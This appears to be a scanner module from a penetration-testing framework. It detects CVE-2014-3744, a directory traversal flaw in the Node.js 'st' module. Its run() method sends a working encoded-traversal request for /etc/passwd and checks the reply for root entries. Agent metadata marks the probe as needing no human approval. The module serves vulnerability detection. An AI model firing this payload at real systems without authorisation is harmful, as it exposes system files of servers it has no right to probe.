#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in the st module before 0."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Node.js st module Directory Traversal Detection',
        'description': 'A directory traversal vulnerability in the st module before 0.2.5 for Node.js allows remote attackers to read arbitrary files via a %2e%2e (encoded dot dot) in an unspecified path.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2014', 'lfi', 'nodejs', 'st', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-3744',
            'https://github.com/advisories/GHSA-69rr-wvh9-6c4q',
            'https://snyk.io/vuln/npm:st:20140206',
            'https://nodesecurity.io/advisories/st_directory_traversal',
            'http://www.openwall.com/lists/oss-security/2014/05/13/1',
        ],
        'cve': 'CVE-2014-3744',
    }

    def run(self):
        r = self.http_request(method="GET", path='/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Node.js st module Directory Traversal detected",
                path='/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            )
            return True
        return False

